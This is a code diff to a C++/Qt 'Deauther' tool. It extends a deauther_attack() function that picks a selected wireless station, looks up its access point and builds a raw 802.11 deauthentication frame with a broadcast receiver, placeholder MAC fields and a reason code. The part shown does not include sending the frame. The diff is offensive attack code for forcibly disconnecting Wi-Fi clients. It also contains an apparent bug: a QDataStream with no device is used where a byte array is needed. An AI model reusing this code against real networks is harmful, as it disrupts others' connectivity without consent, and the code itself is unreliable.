@@ -243,18 +243,59 @@ void Deauther::search_animation (QPushButton *button)
 void Deauther::deauther_attack ()
 {
     QModelIndex index = ui->station_view->currentIndex();
+
+    if (index.row() == -1)
+    {
+        return;
+    }
+
+    /* Retrieve currently selected station */
+    if (!station_mutex.tryLock())
+    {
+        return;
+    }
+
     StationItem *station_item = static_cast<StationItem*>(index.internalPointer());
 
     QByteArray stmac = station_item->stmac();
     ap_info ap = station_item->apInfo();
 
+    station_mutex.unlock();
 
-    const unsigned char deauth_packet[26] = {
+    /* find ap address */
+    bool ap_found = false;
+
+    QByteArray bssid_2;
+    int chan_2;
+    if (!ap.bssid[0].isNull())
+    {
+        bssid_2 = ap.bssid[0];
+        chan_2 = ap.channel[0];
+
+        ap_found = true;
+    }
+
+    QDataStream bssid_5;
+    int chan_5;
+    if (!ap.bssid[1].isNull())
+    {
+        bssid_5 << ap.bssid[1];
+        chan_5 = ap.channel[1];
+
+        ap_found = true;
+    }
+
+    if(!ap_found)
+    {
+        return;
+    }
+
+    unsigned char deauth_packet[26] = {
         /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
-        /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
+        /*  2 - 3  */ 0x3A, 0x01,                         // duration
         /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
-        /* 10 - 15 */ // source (ap)
-        /* 16 - 21 */ // BSSID (ap)
+        /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source place holder (station)
+        /* 16 - 21 */ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, // BSSID place holder (ap)
         /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
         /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
     };
